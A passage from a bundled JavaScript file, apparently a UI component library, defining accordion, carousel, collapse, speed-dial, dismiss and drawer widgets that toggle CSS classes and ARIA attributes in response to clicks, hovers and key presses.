                    defaultModifiers: popper_lite_defaultModifiers
                  });
                  ;
                }
              ),
              /***/
              902: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initAccordions = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    alwaysOpen: false,
                    activeClasses: "bg-gray-100 dark:bg-gray-800 text-gray-900 dark:text-white",
                    inactiveClasses: "text-gray-500 dark:text-gray-400",
                    onOpen: function() {
                    },
                    onClose: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Accordion = (
                    /** @class */
                    function() {
                      function Accordion2(accordionEl, items, options, instanceOptions) {
                        if (accordionEl === void 0) {
                          accordionEl = null;
                        }
                        if (items === void 0) {
                          items = [];
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : accordionEl.id;
                        this._accordionEl = accordionEl;
                        this._items = items;
                        this._options = __assign(__assign({}, Default), options);
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Accordion", this, this._instanceId, instanceOptions.override);
                      }
                      Accordion2.prototype.init = function() {
                        var _this = this;
                        if (this._items.length && !this._initialized) {
                          this._items.forEach(function(item) {
                            if (item.active) {
                              _this.open(item.id);
                            }
                            var clickHandler = function() {
                              _this.toggle(item.id);
                            };
                            item.triggerEl.addEventListener("click", clickHandler);
                            item.clickHandler = clickHandler;
                          });
                          this._initialized = true;
                        }
                      };
                      Accordion2.prototype.destroy = function() {
                        if (this._items.length && this._initialized) {
                          this._items.forEach(function(item) {
                            item.triggerEl.removeEventListener("click", item.clickHandler);
                            delete item.clickHandler;
                          });
                          this._initialized = false;
                        }
                      };
                      Accordion2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Accordion", this._instanceId);
                      };
                      Accordion2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Accordion2.prototype.getItem = function(id) {
                        return this._items.filter(function(item) {
                          return item.id === id;
                        })[0];
                      };
                      Accordion2.prototype.open = function(id) {
                        var _a, _b;
                        var _this = this;
                        var item = this.getItem(id);
                        if (!this._options.alwaysOpen) {
                          this._items.map(function(i) {
                            var _a2, _b2;
                            if (i !== item) {
                              (_a2 = i.triggerEl.classList).remove.apply(_a2, _this._options.activeClasses.split(" "));
                              (_b2 = i.triggerEl.classList).add.apply(_b2, _this._options.inactiveClasses.split(" "));
                              i.targetEl.classList.add("hidden");
                              i.triggerEl.setAttribute("aria-expanded", "false");
                              i.active = false;
                              if (i.iconEl) {
                                i.iconEl.classList.remove("rotate-180");
                              }
                            }
                          });
                        }
                        (_a = item.triggerEl.classList).add.apply(_a, this._options.activeClasses.split(" "));
                        (_b = item.triggerEl.classList).remove.apply(_b, this._options.inactiveClasses.split(" "));
                        item.triggerEl.setAttribute("aria-expanded", "true");
                        item.targetEl.classList.remove("hidden");
                        item.active = true;
                        if (item.iconEl) {
                          item.iconEl.classList.add("rotate-180");
                        }
                        this._options.onOpen(this, item);
                      };
                      Accordion2.prototype.toggle = function(id) {
                        var item = this.getItem(id);
                        if (item.active) {
                          this.close(id);
                        } else {
                          this.open(id);
                        }
                        this._options.onToggle(this, item);
                      };
                      Accordion2.prototype.close = function(id) {
                        var _a, _b;
                        var item = this.getItem(id);
                        (_a = item.triggerEl.classList).remove.apply(_a, this._options.activeClasses.split(" "));
                        (_b = item.triggerEl.classList).add.apply(_b, this._options.inactiveClasses.split(" "));
                        item.targetEl.classList.add("hidden");
                        item.triggerEl.setAttribute("aria-expanded", "false");
                        item.active = false;
                        if (item.iconEl) {
                          item.iconEl.classList.remove("rotate-180");
                        }
                        this._options.onClose(this, item);
                      };
                      return Accordion2;
                    }()
                  );
                  function initAccordions() {
                    document.querySelectorAll("[data-accordion]").forEach(function($accordionEl) {
                      var alwaysOpen = $accordionEl.getAttribute("data-accordion");
                      var activeClasses = $accordionEl.getAttribute("data-active-classes");
                      var inactiveClasses = $accordionEl.getAttribute("data-inactive-classes");
                      var items = [];
                      $accordionEl.querySelectorAll("[data-accordion-target]").forEach(function($triggerEl) {
                        if ($triggerEl.closest("[data-accordion]") === $accordionEl) {
                          var item = {
                            id: $triggerEl.getAttribute("data-accordion-target"),
                            triggerEl: $triggerEl,
                            targetEl: document.querySelector($triggerEl.getAttribute("data-accordion-target")),
                            iconEl: $triggerEl.querySelector("[data-accordion-icon]"),
                            active: $triggerEl.getAttribute("aria-expanded") === "true" ? true : false
                          };
                          items.push(item);
                        }
                      });
                      new Accordion($accordionEl, items, {
                        alwaysOpen: alwaysOpen === "open" ? true : false,
                        activeClasses: activeClasses ? activeClasses : Default.activeClasses,
                        inactiveClasses: inactiveClasses ? inactiveClasses : Default.inactiveClasses
                      });
                    });
                  }
                  exports3.initAccordions = initAccordions;
                  if (typeof window !== "undefined") {
                    window.Accordion = Accordion;
                    window.initAccordions = initAccordions;
                  }
                  exports3["default"] = Accordion;
                }
              ),
              /***/
              33: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initCarousels = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    defaultPosition: 0,
                    indicators: {
                      items: [],
                      activeClasses: "bg-white dark:bg-gray-800",
                      inactiveClasses: "bg-white/50 dark:bg-gray-800/50 hover:bg-white dark:hover:bg-gray-800"
                    },
                    interval: 3e3,
                    onNext: function() {
                    },
                    onPrev: function() {
                    },
                    onChange: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Carousel = (
                    /** @class */
                    function() {
                      function Carousel2(carouselEl, items, options, instanceOptions) {
                        if (carouselEl === void 0) {
                          carouselEl = null;
                        }
                        if (items === void 0) {
                          items = [];
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : carouselEl.id;
                        this._carouselEl = carouselEl;
                        this._items = items;
                        this._options = __assign(__assign(__assign({}, Default), options), { indicators: __assign(__assign({}, Default.indicators), options.indicators) });
                        this._activeItem = this.getItem(this._options.defaultPosition);
                        this._indicators = this._options.indicators.items;
                        this._intervalDuration = this._options.interval;
                        this._intervalInstance = null;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Carousel", this, this._instanceId, instanceOptions.override);
                      }
                      Carousel2.prototype.init = function() {
                        var _this = this;
                        if (this._items.length && !this._initialized) {
                          this._items.map(function(item) {
                            item.el.classList.add("absolute", "inset-0", "transition-transform", "transform");
                          });
                          if (this._getActiveItem()) {
                            this.slideTo(this._getActiveItem().position);
                          } else {
                            this.slideTo(0);
                          }
                          this._indicators.map(function(indicator, position) {
                            indicator.el.addEventListener("click", function() {
                              _this.slideTo(position);
                            });
                          });
                          this._initialized = true;
                        }
                      };
                      Carousel2.prototype.destroy = function() {
                        if (this._initialized) {
                          this._initialized = false;
                        }
                      };
                      Carousel2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Carousel", this._instanceId);
                      };
                      Carousel2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Carousel2.prototype.getItem = function(position) {
                        return this._items[position];
                      };
                      Carousel2.prototype.slideTo = function(position) {
                        var nextItem = this._items[position];
                        var rotationItems = {
                          left: nextItem.position === 0 ? this._items[this._items.length - 1] : this._items[nextItem.position - 1],
                          middle: nextItem,
                          right: nextItem.position === this._items.length - 1 ? this._items[0] : this._items[nextItem.position + 1]
                        };
                        this._rotate(rotationItems);
                        this._setActiveItem(nextItem);
                        if (this._intervalInstance) {
                          this.pause();
                          this.cycle();
                        }
                        this._options.onChange(this);
                      };
                      Carousel2.prototype.next = function() {
                        var activeItem = this._getActiveItem();
                        var nextItem = null;
                        if (activeItem.position === this._items.length - 1) {
                          nextItem = this._items[0];
                        } else {
                          nextItem = this._items[activeItem.position + 1];
                        }
                        this.slideTo(nextItem.position);
                        this._options.onNext(this);
                      };
                      Carousel2.prototype.prev = function() {
                        var activeItem = this._getActiveItem();
                        var prevItem = null;
                        if (activeItem.position === 0) {
                          prevItem = this._items[this._items.length - 1];
                        } else {
                          prevItem = this._items[activeItem.position - 1];
                        }
                        this.slideTo(prevItem.position);
                        this._options.onPrev(this);
                      };
                      Carousel2.prototype._rotate = function(rotationItems) {
                        this._items.map(function(item) {
                          item.el.classList.add("hidden");
                        });
                        rotationItems.left.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-20");
                        rotationItems.left.el.classList.add("-translate-x-full", "z-10");
                        rotationItems.middle.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-10");
                        rotationItems.middle.el.classList.add("translate-x-0", "z-20");
                        rotationItems.right.el.classList.remove("-translate-x-full", "translate-x-full", "translate-x-0", "hidden", "z-20");
                        rotationItems.right.el.classList.add("translate-x-full", "z-10");
                      };
                      Carousel2.prototype.cycle = function() {
                        var _this = this;
                        if (typeof window !== "undefined") {
                          this._intervalInstance = window.setInterval(function() {
                            _this.next();
                          }, this._intervalDuration);
                        }
                      };
                      Carousel2.prototype.pause = function() {
                        clearInterval(this._intervalInstance);
                      };
                      Carousel2.prototype._getActiveItem = function() {
                        return this._activeItem;
                      };
                      Carousel2.prototype._setActiveItem = function(item) {
                        var _a, _b;
                        var _this = this;
                        this._activeItem = item;
                        var position = item.position;
                        if (this._indicators.length) {
                          this._indicators.map(function(indicator) {
                            var _a2, _b2;
                            indicator.el.setAttribute("aria-current", "false");
                            (_a2 = indicator.el.classList).remove.apply(_a2, _this._options.indicators.activeClasses.split(" "));
                            (_b2 = indicator.el.classList).add.apply(_b2, _this._options.indicators.inactiveClasses.split(" "));
                          });
                          (_a = this._indicators[position].el.classList).add.apply(_a, this._options.indicators.activeClasses.split(" "));
                          (_b = this._indicators[position].el.classList).remove.apply(_b, this._options.indicators.inactiveClasses.split(" "));
                          this._indicators[position].el.setAttribute("aria-current", "true");
                        }
                      };
                      return Carousel2;
                    }()
                  );
                  function initCarousels() {
                    document.querySelectorAll("[data-carousel]").forEach(function($carouselEl) {
                      var interval = $carouselEl.getAttribute("data-carousel-interval");
                      var slide = $carouselEl.getAttribute("data-carousel") === "slide" ? true : false;
                      var items = [];
                      var defaultPosition = 0;
                      if ($carouselEl.querySelectorAll("[data-carousel-item]").length) {
                        Array.from($carouselEl.querySelectorAll("[data-carousel-item]")).map(function($carouselItemEl, position) {
                          items.push({
                            position,
                            el: $carouselItemEl
                          });
                          if ($carouselItemEl.getAttribute("data-carousel-item") === "active") {
                            defaultPosition = position;
                          }
                        });
                      }
                      var indicators = [];
                      if ($carouselEl.querySelectorAll("[data-carousel-slide-to]").length) {
                        Array.from($carouselEl.querySelectorAll("[data-carousel-slide-to]")).map(function($indicatorEl) {
                          indicators.push({
                            position: parseInt($indicatorEl.getAttribute("data-carousel-slide-to")),
                            el: $indicatorEl
                          });
                        });
                      }
                      var carousel = new Carousel($carouselEl, items, {
                        defaultPosition,
                        indicators: {
                          items: indicators
                        },
                        interval: interval ? interval : Default.interval
                      });
                      if (slide) {
                        carousel.cycle();
                      }
                      var carouselNextEl = $carouselEl.querySelector("[data-carousel-next]");
                      var carouselPrevEl = $carouselEl.querySelector("[data-carousel-prev]");
                      if (carouselNextEl) {
                        carouselNextEl.addEventListener("click", function() {
                          carousel.next();
                        });
                      }
                      if (carouselPrevEl) {
                        carouselPrevEl.addEventListener("click", function() {
                          carousel.prev();
                        });
                      }
                    });
                  }
                  exports3.initCarousels = initCarousels;
                  if (typeof window !== "undefined") {
                    window.Carousel = Carousel;
                    window.initCarousels = initCarousels;
                  }
                  exports3["default"] = Carousel;
                }
              ),
              /***/
              922: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initCollapses = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    onCollapse: function() {
                    },
                    onExpand: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Collapse = (
                    /** @class */
                    function() {
                      function Collapse2(targetEl, triggerEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (triggerEl === void 0) {
                          triggerEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._triggerEl = triggerEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Collapse", this, this._instanceId, instanceOptions.override);
                      }
                      Collapse2.prototype.init = function() {
                        var _this = this;
                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          if (this._triggerEl.hasAttribute("aria-expanded")) {
                            this._visible = this._triggerEl.getAttribute("aria-expanded") === "true";
                          } else {
                            this._visible = !this._targetEl.classList.contains("hidden");
                          }
                          this._clickHandler = function() {
                            _this.toggle();
                          };
                          this._triggerEl.addEventListener("click", this._clickHandler);
                          this._initialized = true;
                        }
                      };
                      Collapse2.prototype.destroy = function() {
                        if (this._triggerEl && this._initialized) {
                          this._triggerEl.removeEventListener("click", this._clickHandler);
                          this._initialized = false;
                        }
                      };
                      Collapse2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Collapse", this._instanceId);
                      };
                      Collapse2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Collapse2.prototype.collapse = function() {
                        this._targetEl.classList.add("hidden");
                        if (this._triggerEl) {
                          this._triggerEl.setAttribute("aria-expanded", "false");
                        }
                        this._visible = false;
                        this._options.onCollapse(this);
                      };
                      Collapse2.prototype.expand = function() {
                        this._targetEl.classList.remove("hidden");
                        if (this._triggerEl) {
                          this._triggerEl.setAttribute("aria-expanded", "true");
                        }
                        this._visible = true;
                        this._options.onExpand(this);
                      };
                      Collapse2.prototype.toggle = function() {
                        if (this._visible) {
                          this.collapse();
                        } else {
                          this.expand();
                        }
                        this._options.onToggle(this);
                      };
                      return Collapse2;
                    }()
                  );
                  function initCollapses() {
                    document.querySelectorAll("[data-collapse-toggle]").forEach(function($triggerEl) {
                      var targetId = $triggerEl.getAttribute("data-collapse-toggle");
                      var $targetEl = document.getElementById(targetId);
                      if ($targetEl) {
                        if (!instances_1.default.instanceExists("Collapse", $targetEl.getAttribute("id"))) {
                          new Collapse($targetEl, $triggerEl);
                        } else {
                          new Collapse($targetEl, $triggerEl, {}, {
                            id: $targetEl.getAttribute("id") + "_" + instances_1.default._generateRandomId()
                          });
                        }
                      } else {
                        console.error('The target element with id "'.concat(targetId, '" does not exist. Please check the data-collapse-toggle attribute.'));
                      }
                    });
                  }
                  exports3.initCollapses = initCollapses;
                  if (typeof window !== "undefined") {
                    window.Collapse = Collapse;
                    window.initCollapses = initCollapses;
                  }
                  exports3["default"] = Collapse;
                }
              ),
              /***/
              556: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initDials = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    triggerType: "hover",
                    onShow: function() {
                    },
                    onHide: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Dial = (
                    /** @class */
                    function() {
                      function Dial2(parentEl, triggerEl, targetEl, options, instanceOptions) {
                        if (parentEl === void 0) {
                          parentEl = null;
                        }
                        if (triggerEl === void 0) {
                          triggerEl = null;
                        }
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._parentEl = parentEl;
                        this._triggerEl = triggerEl;
                        this._targetEl = targetEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Dial", this, this._instanceId, instanceOptions.override);
                      }
                      Dial2.prototype.init = function() {
                        var _this = this;
                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          var triggerEventTypes = this._getTriggerEventTypes(this._options.triggerType);
                          this._showEventHandler = function() {
                            _this.show();
                          };
                          triggerEventTypes.showEvents.forEach(function(ev) {
                            _this._triggerEl.addEventListener(ev, _this._showEventHandler);
                            _this._targetEl.addEventListener(ev, _this._showEventHandler);
                          });
                          this._hideEventHandler = function() {
                            if (!_this._parentEl.matches(":hover")) {
                              _this.hide();
                            }
                          };
                          triggerEventTypes.hideEvents.forEach(function(ev) {
                            _this._parentEl.addEventListener(ev, _this._hideEventHandler);
                          });
                          this._initialized = true;
                        }
                      };
                      Dial2.prototype.destroy = function() {
                        var _this = this;
                        if (this._initialized) {
                          var triggerEventTypes = this._getTriggerEventTypes(this._options.triggerType);
                          triggerEventTypes.showEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._showEventHandler);
                            _this._targetEl.removeEventListener(ev, _this._showEventHandler);
                          });
                          triggerEventTypes.hideEvents.forEach(function(ev) {
                            _this._parentEl.removeEventListener(ev, _this._hideEventHandler);
                          });
                          this._initialized = false;
                        }
                      };
                      Dial2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Dial", this._instanceId);
                      };
                      Dial2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Dial2.prototype.hide = function() {
                        this._targetEl.classList.add("hidden");
                        if (this._triggerEl) {
                          this._triggerEl.setAttribute("aria-expanded", "false");
                        }
                        this._visible = false;
                        this._options.onHide(this);
                      };
                      Dial2.prototype.show = function() {
                        this._targetEl.classList.remove("hidden");
                        if (this._triggerEl) {
                          this._triggerEl.setAttribute("aria-expanded", "true");
                        }
                        this._visible = true;
                        this._options.onShow(this);
                      };
                      Dial2.prototype.toggle = function() {
                        if (this._visible) {
                          this.hide();
                        } else {
                          this.show();
                        }
                      };
                      Dial2.prototype.isHidden = function() {
                        return !this._visible;
                      };
                      Dial2.prototype.isVisible = function() {
                        return this._visible;
                      };
                      Dial2.prototype._getTriggerEventTypes = function(triggerType) {
                        switch (triggerType) {
                          case "hover":
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                          case "click":
                            return {
                              showEvents: ["click", "focus"],
                              hideEvents: ["focusout", "blur"]
                            };
                          case "none":
                            return {
                              showEvents: [],
                              hideEvents: []
                            };
                          default:
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                        }
                      };
                      return Dial2;
                    }()
                  );
                  function initDials() {
                    document.querySelectorAll("[data-dial-init]").forEach(function($parentEl) {
                      var $triggerEl = $parentEl.querySelector("[data-dial-toggle]");
                      if ($triggerEl) {
                        var dialId = $triggerEl.getAttribute("data-dial-toggle");
                        var $dialEl = document.getElementById(dialId);
                        if ($dialEl) {
                          var triggerType = $triggerEl.getAttribute("data-dial-trigger");
                          new Dial($parentEl, $triggerEl, $dialEl, {
                            triggerType: triggerType ? triggerType : Default.triggerType
                          });
                        } else {
                          console.error("Dial with id ".concat(dialId, " does not exist. Are you sure that the data-dial-toggle attribute points to the correct modal id?"));
                        }
                      } else {
                        console.error("Dial with id ".concat($parentEl.id, " does not have a trigger element. Are you sure that the data-dial-toggle attribute exists?"));
                      }
                    });
                  }
                  exports3.initDials = initDials;
                  if (typeof window !== "undefined") {
                    window.Dial = Dial;
                    window.initDials = initDials;
                  }
                  exports3["default"] = Dial;
                }
              ),
              /***/
              791: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initDismisses = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    transition: "transition-opacity",
                    duration: 300,
                    timing: "ease-out",
                    onHide: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Dismiss = (
                    /** @class */
                    function() {
                      function Dismiss2(targetEl, triggerEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (triggerEl === void 0) {
                          triggerEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._triggerEl = triggerEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Dismiss", this, this._instanceId, instanceOptions.override);
                      }
                      Dismiss2.prototype.init = function() {
                        var _this = this;
                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          this._clickHandler = function() {
                            _this.hide();
                          };
                          this._triggerEl.addEventListener("click", this._clickHandler);
                          this._initialized = true;
                        }
                      };
                      Dismiss2.prototype.destroy = function() {
                        if (this._triggerEl && this._initialized) {
                          this._triggerEl.removeEventListener("click", this._clickHandler);
                          this._initialized = false;
                        }
                      };
                      Dismiss2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Dismiss", this._instanceId);
                      };
                      Dismiss2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Dismiss2.prototype.hide = function() {
                        var _this = this;
                        this._targetEl.classList.add(this._options.transition, "duration-".concat(this._options.duration), this._options.timing, "opacity-0");
                        setTimeout(function() {
                          _this._targetEl.classList.add("hidden");
                        }, this._options.duration);
                        this._options.onHide(this, this._targetEl);
                      };
                      return Dismiss2;
                    }()
                  );
                  function initDismisses() {
                    document.querySelectorAll("[data-dismiss-target]").forEach(function($triggerEl) {
                      var targetId = $triggerEl.getAttribute("data-dismiss-target");
                      var $dismissEl = document.querySelector(targetId);
                      if ($dismissEl) {
                        new Dismiss($dismissEl, $triggerEl);
                      } else {
                        console.error('The dismiss element with id "'.concat(targetId, '" does not exist. Please check the data-dismiss-target attribute.'));
                      }
                    });
                  }
                  exports3.initDismisses = initDismisses;
                  if (typeof window !== "undefined") {
                    window.Dismiss = Dismiss;
                    window.initDismisses = initDismisses;
                  }
                  exports3["default"] = Dismiss;
                }
              ),
              /***/
              340: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initDrawers = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    placement: "left",
                    bodyScrolling: false,
                    backdrop: true,
                    edge: false,
                    edgeOffset: "bottom-[60px]",
                    backdropClasses: "bg-gray-900/50 dark:bg-gray-900/80 fixed inset-0 z-30",
                    onShow: function() {
                    },
                    onHide: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Drawer = (
                    /** @class */
                    function() {
                      function Drawer2(targetEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._eventListenerInstances = [];
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Drawer", this, this._instanceId, instanceOptions.override);
                      }
                      Drawer2.prototype.init = function() {
                        var _this = this;
                        if (this._targetEl && !this._initialized) {
                          this._targetEl.setAttribute("aria-hidden", "true");
                          this._targetEl.classList.add("transition-transform");
                          this._getPlacementClasses(this._options.placement).base.map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                          this._handleEscapeKey = function(event) {
                            if (event.key === "Escape") {
                              if (_this.isVisible()) {
                                _this.hide();
                              }
                            }
                          };
                          document.addEventListener("keydown", this._handleEscapeKey);
                          this._initialized = true;
                        }
                      };
                      Drawer2.prototype.destroy = function() {
                        if (this._initialized) {
                          this.removeAllEventListenerInstances();
                          this._destroyBackdropEl();
                          document.removeEventListener("keydown", this._handleEscapeKey);
                          this._initialized = false;
                        }
                      };
                      Drawer2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Drawer", this._instanceId);
                      };
                      Drawer2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Drawer2.prototype.hide = function() {
                        var _this = this;
                        if (this._options.edge) {
                          this._getPlacementClasses(this._options.placement + "-edge").active.map(function(c) {
                            _this._targetEl.classList.remove(c);
                          });
                          this._getPlacementClasses(this._options.placement + "-edge").inactive.map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                        } else {
                          this._getPlacementClasses(this._options.placement).active.map(function(c) {
                            _this._targetEl.classList.remove(c);
                          });
                          this._getPlacementClasses(this._options.placement).inactive.map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                        }
                        this._targetEl.setAttribute("aria-hidden", "true");
                        this._targetEl.removeAttribute("aria-modal");
                        this._targetEl.removeAttribute("role");
                        if (!this._options.bodyScrolling) {
                          document.body.classList.remove("overflow-hidden");
                        }
                        if (this._options.backdrop) {
                          this._destroyBackdropEl();
                        }
                        this._visible = false;
                        this._options.onHide(this);
                      };
                      Drawer2.prototype.show = function() {
                        var _this = this;
                        if (this._options.edge) {
                          this._getPlacementClasses(this._options.placement + "-edge").active.map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                          this._getPlacementClasses(this._options.placement + "-edge").inactive.map(function(c) {
                            _this._targetEl.classList.remove(c);
                          });
                        } else {
                          this._getPlacementClasses(this._options.placement).active.map(function(c) {
                            _this._targetEl.classList.add(c);
                          });
                          this._getPlacementClasses(this._options.placement).inactive.map(function(c) {
                            _this._targetEl.classList.remove(c);
                          });
                        }
                        this._targetEl.setAttribute("aria-modal", "true");
                        this._targetEl.setAttribute("role", "dialog");
                        this._targetEl.removeAttribute("aria-hidden");
                        if (!this._options.bodyScrolling) {
                          document.body.classList.add("overflow-hidden");
                        }
                        if (this._options.backdrop) {
                          this._createBackdrop();
                        }
                        this._visible = true;
                        this._options.onShow(this);
                      };
                      Drawer2.prototype.toggle = function() {
                        if (this.isVisible()) {
                          this.hide();
                        } else {
                          this.show();
                        }
                      };
                      Drawer2.prototype._createBackdrop = function() {
                        var _a;
                        var _this = this;
                        if (!this._visible) {
                          var backdropEl = document.createElement("div");
                          backdropEl.setAttribute("drawer-backdrop", "");
                          (_a = backdropEl.classList).add.apply(_a, this._options.backdropClasses.split(" "));
                          document.querySelector("body").append(backdropEl);
                          backdropEl.addEventListener("click", function() {
                            _this.hide();
                          });
                        }
                      };
                      Drawer2.prototype._destroyBackdropEl = function() {
                        if (this._visible) {
                          document.querySelector("[drawer-backdrop]").remove();
                        }
                      };
                      Drawer2.prototype._getPlacementClasses = function(placement) {
                        switch (placement) {
                          case "top":
                            return {
                              base: ["top-0", "left-0", "right-0"],
                              active: ["transform-none"],
                              inactive: ["-translate-y-full"]
                            };
                          case "right":
                            return {
                              base: ["right-0", "top-0"],
                              active: ["transform-none"],
                              inactive: ["translate-x-full"]
                            };
                          case "bottom":
                            return {
                              base: ["bottom-0", "left-0", "right-0"],
                              active: ["transform-none"],
                              inactive: ["translate-y-full"]
                            };
                          case "left":
                            return {
                              base: ["left-0", "top-0"],
                              active: ["transform-none"],
